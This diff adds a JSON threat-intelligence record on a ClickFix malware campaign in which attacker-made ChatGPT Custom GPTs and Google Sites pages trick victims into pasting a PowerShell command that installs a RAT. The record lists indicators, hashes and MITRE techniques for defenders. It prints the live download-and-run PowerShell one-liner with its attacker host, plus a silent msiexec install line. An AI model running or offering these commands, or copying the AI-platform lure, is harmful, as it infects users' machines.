@@ -1,0 +1,856 @@
+{
+  "malware_family": "",
+  "threat_actor": "",
+  "platforms": [
+    "windows"
+  ],
+  "summary": "A ClickFix campaign that abuses attacker-created ChatGPT Custom GPTs (\"Plus 5.6\") and Google Sites pages to trick victims into pasting a PowerShell one-liner, which silently installs a malicious MSI (ISOSimple.msi). The MSI DLL-sideloads a patched Canon (or, in V2, Stardock) DLL that runs an encrypted loader hidden in a .wav/NuGet carrier and unpacks an encrypted virtual file system holding persistence scripts plus a full-featured RAT. Persistence is established through an HKCU Run value and a scheduled task sharing the same name, which are re-created if deleted.",
+  "mitre_techniques": [
+    "T1204.004",
+    "T1204.002",
+    "T1059.001",
+    "T1218.007",
+    "T1574.002",
+    "T1547.001",
+    "T1053.005",
+    "T1027",
+    "T1140",
+    "T1620",
+    "T1562.001",
+    "T1497.001",
+    "T1082",
+    "T1518",
+    "T1047",
+    "T1105",
+    "T1071.001",
+    "T1071.004",
+    "T1218.011",
+    "T1218.010"
+  ],
+  "host_artifacts": [
+    {
+      "kind": "pdb_path",
+      "value": "c:\\data\\home\\ceidriver\\...\\ceiinfo\\x64\\release\\ceiinfolog.pdb",
+      "context": "Retained Canon build path in the patched ceiinfolog.dll",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "import_name",
+      "value": "rdCore.dll!instance_levels_",
+      "context": "Added import in patched ceiinfolog.dll forcing the sideload",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "%LOCALAPPDATA%\\Programs\\Advanced Printer Configuration Reader\\",
+      "context": "V1 (Canon) MSI install folder",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "%LOCALAPPDATA%\\Programs\\Stardock Smart DeElevation Tool\\",
+      "context": "V2 (Stardock) MSI install folder",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "%LOCALAPPDATA%\\AppstorageFile\\GOMCam2024.exe",
+      "context": "Signed GOMCam dropped by the RAT as follow-on payload",
+      "specificity": "medium",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "COTFileReadApp.exe",
+      "context": "Legitimate Canon-signed host abused for sideloading (do not block globally)",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "ceiinfolog.dll",
+      "context": "Patched Canon DLL, signature stripped, imports rdCore.dll",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "rdCore.dll",
+      "context": "Malicious DLL decoding loader from .wav; fake Polly 7.2.3 version info",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "WPFLocalizeExtension.dll",
+      "context": "Malicious native DLL borrowing an open-source .NET library name",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "WMPCL.dll",
+      "context": "Malicious helper DLL loaded by rdCore before payload runs",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "Common.Integrator.Preview.wav",
+      "context": "WAV file carrying the XOR-encrypted loader from offset 0x24362",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "monitor.raw",
+      "context": "Custom encrypted archive holding persistence script and RAT",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "IconEdit2Turb.msi",
+      "context": "V2 Stardock Smart DeElevation Tool installer",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "DeElevate64.exe",
+      "context": "Legitimate Stardock-signed host abused in V2 (do not block globally)",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "DeElevator64.dll",
+      "context": "Patched Stardock DLL importing I++u.dll (V2)",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "I++u.dll",
+      "context": "V2 loader DLL, fake SharpCompress version info",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "senddmp.resources.dll",
+      "context": "V2 alloc/exec helper DLL",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "res.dll",
+      "context": "V2 network helper DLL",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "Build.dat",
+      "context": "Genuine Microsoft NuGet package with loader wedged in compressed data (V2)",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "execute_engine_disconnect.raw",
+      "context": "V2 encrypted archive (persistence script + RAT)",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "UltraFreeISOCreateWizardSolution.msi",
+      "context": "Third MSI hosted on same delivery server, seen 2026-09-23",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "ISOSimple.msi",
+      "context": "Malicious 'Advanced Printer Configuration Reader' installer",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "%TEMP%\\<32 hex characters>_ISOSimple.msi",
+      "context": "GUID-prefixed MSI drop, never the same name twice",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "59750a801a274057b126399b1e97421f_ISOSimple.msi",
+      "context": "Observed temp MSI quarantined as Trojan:Script/Wacatac.H!ml",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "1777.ps1",
+      "context": "ClickFix stager written to %TEMP% (random numeric name per victim)",
+      "specificity": "medium",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "6469.ps1",
+      "context": "Obfuscated ClickFix stager (filename varies per victim)",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "5689.ps1",
+      "context": "V2 ClickFix stager (filename varies per victim)",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "registry_value",
+      "value": "Canon Configuration Reader",
+      "context": "HKCU Run value name, re-created if deleted (V1)",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "scheduled_task",
+      "value": "Canon Configuration Reader",
+      "context": "Scheduled task name sharing the Run value name (V1)",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "registry_value",
+      "value": "Stardock DeElevation Tool",
+      "context": "V2 HKCU Run value name",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "scheduled_task",
+      "value": "Stardock DeElevation Tool",
+      "context": "V2 scheduled task name",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "[-] Not Found Storage !",
+      "context": "Loader shellcode error when the encrypted storage file is missing",
+      "specificity": "high",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Current Gate Host:",
+      "context": "RAT string naming its C2 'Gate'",
+      "specificity": "high",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": ".mrdata",
+      "context": "Section name string decrypted from loader shellcode",
+      "specificity": "high",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "LOADING...",
+      "context": "Fake loading window shown by the loader",
+      "specificity": "medium",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Advanced Printer Configuration Reader",
+      "context": "V1 MSI display name",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Softplicity",
+      "context": "Fake publisher of the V1 MSI",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Stardock Smart DeElevation Tool",
+      "context": "V2 MSI display name",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Plus 5.6",
+      "context": "Attacker Custom GPT title impersonating a ChatGPT model",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Service Availability Notice",
+      "context": "Message served by the Custom GPT to push the backup domain",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Broadcast start failed: RD worker launch failed",
+      "context": "RAT remote desktop/broadcast feature string",
+      "specificity": "high",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "DLL RUNDLL32 payload is missing",
+      "context": "RAT follow-on payload handling string",
+      "specificity": "high",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "-NoProfile -ExecutionPolicy Bypass -Command \"Expand-Archive -LiteralPath '",
+      "context": "RAT command line used to process downloaded payload archives",
+      "specificity": "high",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "/SC ONLOGON /RU SYSTEM /F /RL",
+      "context": "schtasks arguments in decrypted RAT strings",
+      "specificity": "high",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "msedge.exe;chrome.exe;firefox.exe;brave.exe;opera.exe;vivaldi.exe;iexplore.exe;arc.exe;...",
+      "context": "Browser list known to the RAT (17 browsers)",
+      "specificity": "medium",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "SELECT displayName FROM AntiVirusProduct",
+      "context": "WMI query for installed antivirus",
+      "specificity": "medium",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "SELECT AMServiceEnabled FROM MSFT_MpComputerStatus",
+      "context": "WMI query for Microsoft Defender status",
+      "specificity": "medium",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "VMwareVMware",
+      "context": "Anti-VM CPU vendor string in loader shellcode",
+      "specificity": "medium",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "QEMU-GA",
+      "context": "Anti-VM service/driver string in loader shellcode",
+      "specificity": "medium",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "config_marker",
+      "value": "0x26ace8d1",
+      "context": "Master key for the monitor.raw encrypted file system index",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "config_marker",
+      "value": "0x24362",
+      "context": "Offset in Common.Integrator.Preview.wav where ciphertext begins (fseek target)",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "config_marker",
+      "value": "0x53593",
+      "context": "341,395 bytes read from the .wav and XOR-decoded in place",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "config_marker",
+      "value": "1520498",
+      "context": "Layer-1 integer offset added to each array element of the PowerShell stager",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "config_marker",
+      "value": "6178128",
+      "context": "Layer-2 per-string offset used to rebuild encoded PowerShell strings",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "\"C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\PowerShell.exe\" -ExecutionPolicy Bypass \"irm 1614733393/12 | Out-File $env:temp\\1777.ps1;& $env:temp\\1777.ps1\"",
+      "context": "ClickFix command pasted by victim (parent: user shell)",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "msiexec.exe /i \"%TEMP%\\<32 hex characters>_ISOSimple.msi\" /qn /norestart",
+      "context": "Silent MSI install from decoded script, hidden window; parent powershell.exe",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "parent_child",
+      "value": "powershell.exe -> msiexec.exe",
+      "context": "PowerShell launching msiexec on a GUID-named MSI in %TEMP%",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "parent_child",
+      "value": "msiexec.exe -> COTFileReadApp.exe",
+      "context": "Installer custom action launches the signed host from a fake product folder",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "Invoke-WebRequest -OutFile %TEMP%\\verification2<n>.ps1",
+      "context": "Earlier /verification2 wave stager seen in telemetry",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "url",
+      "value": "https://chatgpt.com/g/g-6ab595ad6554819181b686d4876efb80-plus-5-6",
+      "context": "Attacker Custom GPT 'Plus 5.6' lure page (taken down)",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://chatgpt.com/g/g-6ab6ba039440819185ed491740b11cf8-plus-5-6",
+      "context": "Second attacker Custom GPT 'Plus 5.6' lure page",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://sites.google.com/view/antibot172881",
+      "context": "Google Sites ClickFix CAPTCHA lure (backup domain)",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://sites.google.com/view/antibot381122/",
+      "context": "Newer Google Sites ClickFix lure (added October 14)",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "gptverification.com",
+      "context": "ClickFix lure domain added October 14",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "http://1614733393/app/afafa98279c9/ISOSimple.msi",
+      "context": "V1 MSI download URL using decimal-IP host",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "http://1614733393/s/50d6565cf39e",
+      "context": "V2 stage-2 script URL (freshly obfuscated per request)",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "http://1614733393/app/50d6565cf39e/IconEdit2Turb.msi",
+      "context": "V2 MSI download URL",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "http://1614733393/app/a26b67343315/UltraFreeISOCreateWizardSolution.msi",
+      "context": "Third MSI on same server, seen 2026-09-23 (not obtained)",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "96.62.224.81",
+      "context": "Hosts the ClickFix script and the MSI",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "45.140.205.28",
+      "context": "Payload server observed in a related incident",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "1614733393",
+      "context": "Decimal-IP form of 96.62.224.81 used to evade dotted-IP rules",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/12",
+      "context": "ClickFix stager path on decimal-IP host (V1 Canon wave)",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/13",
+      "context": "Stager path for UltraFreeISO and overlay MSI waves",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/s/50d6565cf39e",
+      "context": "V2 second-stage script path",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "cloudflare-dns.com",
+      "context": "DNS-over-HTTPS resolver used for RAT C2 lookup",
+      "specificity": "medium",
+      "evidence": "strings_listing",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "dns.google",
+      "context": "DNS-over-HTTPS resolver used for RAT C2 lookup",
+      "specificity": "medium",
+      "evidence": "strings_listing",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "dns.quad9.net",
+      "context": "DNS-over-HTTPS resolver used for RAT C2 lookup",
+      "specificity": "medium",
+      "evidence": "strings_listing",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [
+    {
+      "sha256": "14e3376befd4b7b52de0757b6264da294ac6b0f9e4ff51cb9bc5b19b243fe335",
+      "description": "Obfuscated ClickFix stager (6469.ps1, filename varies per victim)"
+    },
+    {
+      "sha256": "c4603646701069ebdeabc96f74e1f947355ace8575560986d8393fcc6b88d0b7",
+      "description": "V2 ClickFix stager (5689.ps1)"
+    },
+    {
+      "sha256": "6761aad48a3f987238994d92bca97e4b8550e0150607bd67b47b1b6366a371fc",
+      "description": "Malicious MSI 'Advanced Printer Configuration Reader' (V1)"
+    },
+    {
+      "sha256": "e58831766e8d4313db9f8b85f90c3a840aa0d84cfeac285beefa40e39ad0d1fb",
+      "description": "Patched Canon ceiinfolog.dll with signature stripped and rdCore.dll import"
+    },
+    {
+      "sha256": "b77575413c0f97eaf31e4a44c884c1ecdc0049ec89916ceb0bf3aaaedc0442fe",
+      "description": "rdCore.dll decoding and running the loader from the WAV"
+    },
+    {
+      "sha256": "eff5d63ddf1813962f0d8ad1250cea5486c8bb5dd27c3f432b43957a33e43764",
+      "description": "Malicious WPFLocalizeExtension.dll (native code, borrowed library name)"
+    },
+    {
+      "sha256": "9c615db040b88c18ce6b96f30d08797045b7d506f940bea452dc7a6992fdbb8d",
+      "description": "WMPCL.dll helper loaded by rdCore.dll"
+    },
+    {
+      "sha256": "54c94f85ba6e950903d5ff42c0971c5a9d0741596be26e06afe7d60ec38edf31",
+      "description": "Common.Integrator.Preview.wav carrying the XOR-encrypted loader"
+    },
+    {
+      "sha256": "e614b7d5a7a363fb1b355a87e2e8d9e8a05bbbca08f2cee3d606bdb5015ac53b",
+      "description": "monitor.raw encrypted archive holding persistence script and RAT"
+    },
+    {
+      "sha256": "20c7befc174a61117770535e809046c75e93c71284bf1a9c6cd532f55b315f53",
+      "description": "Loader shellcode decoded from the WAV (memory only)"
+    },
+    {
+      "sha256": "ab65bbfc505dbe1cebe6021fb36e2011f6aa1d64f5d87cee1cbee3fc2a0c7907",
+      "description": "Final RAT shellcode from monitor.raw (memory only, identical in V2)"
+    },
+    {
+      "sha256": "278e2f3e2f26c18666b89ef774b4af9ce954e36b2bf54a2392608619245d8c48",
+      "description": "Legitimate Canon-signed COTFileReadApp.exe abused as host"
+    },
+    {
+      "sha256": "91a22cf3154944897cbcaffc7d20d4596e972d280ee134197d41d8d8eefb0fe2",
+      "description": "V2 'Stardock Smart DeElevation Tool' installer (IconEdit2Turb.msi)"
+    },
+    {
+      "sha256": "22869e3326fe1de011cd500e666769027126c5c440b76837baf55139f30094e4",
+      "description": "Legitimate Stardock-signed DeElevate64.exe host (V2)"
+    },
+    {
+      "sha256": "0457414c4504b70115798eee9c8384a8bf9e793461ffb2e0661a6dcc6ed4809f",
+      "description": "Patched Stardock DeElevator64.dll importing I++u.dll (V2)"
+    },
+    {
+      "sha256": "3cd1484cc5bf10e22d79784beba58a75d7b126c46efb5e1a85d6aab884447621",
+      "description": "V2 loader DLL with fake SharpCompress version info"
+    },
+    {
+      "sha256": "b59a21a8d4c0c11a9ecbbdbe2a2938499c99c5ebb210c9c6db9683c7ad19f4c4",
+      "description": "V2 alloc/exec helper DLL (senddmp.resources.dll)"
+    },
+    {
+      "sha256": "a27cafb84876a3374ef4aba1062345def6cd0b029eaf8e0dc44fa24fc943f3c6",
+      "description": "V2 network helper DLL (res.dll)"
+    },
+    {
+      "sha256": "d3fda1e6cf886fd530bf62e2d16c39ad23ed12a2c933fc211f1f4876ceaa033e",
+      "description": "Build.dat NuGet package carrying the encrypted loader (V2)"
+    },
+    {
+      "sha256": "d5acf44658f0dce90bd160f15d8e07a96938c81661d87dc7e9cb0107863bfb90",
+      "description": "V2 encrypted archive with persistence script and RAT"
+    }
+  ],
+  "file_types": [
+    "pe",
+    "script",
+    "archive",
+    "unknown"
+  ]
+}
